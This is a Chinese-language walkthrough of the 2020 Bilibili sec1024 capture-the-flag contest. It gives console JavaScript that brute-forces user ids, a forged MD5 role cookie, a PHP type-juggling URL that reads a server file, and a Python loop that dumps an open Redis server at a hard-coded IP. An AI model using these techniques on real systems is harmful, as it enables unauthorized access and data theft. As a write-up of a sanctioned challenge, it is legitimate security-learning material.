# 2020-bilibili-sec1024

> 本记录由 TePuint Club 赞助完成

> 注意：如果你没有达到70分请不要往下查看

活动地址：[sec1024](https://security.bilibili.com/sec1024/)

## 第一题 - 页面的背后是什么？

打开DevTool审查元素，在`<input>`中找到data

## 第二题 - 真正的秘密只有特殊的设备才能看到

修改浏览器的User-Agent为 `bilibili Security Browser`，然后刷新网页，就可以看到flag了。

## 第三题 - 密码是啥？

就是弱口令，完全靠猜，用户名 `admin` ，密码 `bilibili` 。

或者直接在Console中输入：

```javascript
$.ajax({
    url: "api/ctf/3",
    type: "post",
    contentType: "application/json",
    dataType: "json",
    data: JSON.stringify({
        username: "admin",
        passwd: "bilibili",
    }),
    success: function (data) {
        console.log(data.data)
    }
})
```

## 第四题 - 对不起，权限不足～

cookies中 `role` 对应的值为user的MD5，所以将这个值改为 `Administrator` 的MD5，即 `7b7bc2512ee1fedcd76bdc68926d4f7b` ，然后刷新网页，就可以看到flag了。

## 第五题 - 别人的秘密

使用Console向后穷举，我也不知道那个uid哪里来的。

在Console中输入：

```javascript
get(100336889) //这里每个人有可能不一样，请在网页中查找
function get(uid) {
    $.ajax({
        url: "api/ctf/5?uid=" + uid,
        type: "get",
        success: function (data) {
            if (data.code == 200) {
                console.log(data.data)
            } else {
                get(uid + 1)
            }
        }
    })
}
```

## 第十题 - 结束亦是开始

你没看错，这里是第十题，但这一题的入口在第六题，也就是第六题做完是第十题的答案。

>注意：每个人的靶机不一定相同，请注意更换IP

1. 访问 `http://120.92.151.189/blog/test.php` （扫目录扫出来的）
2. 将网页中所有的内容复制粘贴到Console中，获取str1和str2
```javascript
 var str1 = "\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9";
 var str2 = "bilibili1024havefun";
 console.log()
```
3. 将str1进行Unicode转中文得到 `程序员最多的地方` 即 GitHub
4. 在GitHub搜索str2,即"bilibili1024havefun"
5. 在搜索结果中找到与end有关的那个 [传送门](https://github.com/interesting-1024/end/blob/main/end.php)
6. 分析PHP文件,id为不含1的数组，路径不清楚要猜
```php
 <?php

    //filename end.php

    $bilibili = "bilibili1024havefun";

    $str = intval($_GET['id']);
    $reg = preg_match('/\d/is', $_GET['id']);

    if (!is_numeric($_GET['id']) and $reg !== 1 and $str === 1) {
        $content = file_get_contents($_GET['url']);

        //文件路径猜解
        if (false) {
            echo "还差一点点啦～";
        } else {
            echo $flag;
        }
    } else {
        echo "你想要的不在这儿～";
    }
    ?>
```
7. 构造URL，使满足 `!is_numeric($_GET['id']) and $reg !== 1 and $str === 1`
8. 猜URL，访问 `http://120.92.151.189/blog/end.php?id[]=&url=./flag.txt` 得到一张图片
9. 图片另存为，并用npp或者记事本打开,就可以在文件末尾找到flag

## 第八题

在做本题时可能会遇到redis连接不上的问题，我们使用Python脚本进行轰炸

首先安装redis库：`!pip3 install redis`

接着执行以下Python脚本：

```python
import redis

serve = '45.113.201.36' #设置服务器IP地址

print('Connecting the Server ('+serve+') ...')
while True:
    try:
        r = redis.StrictRedis(host=serve, port=6379)
        keys = r.keys()
        print('We got the flag:')
        for key in keys:
            value = r.get(key)
            print(key, value)
        break
    except:
        print('Error: Connection timed out')
        pass
```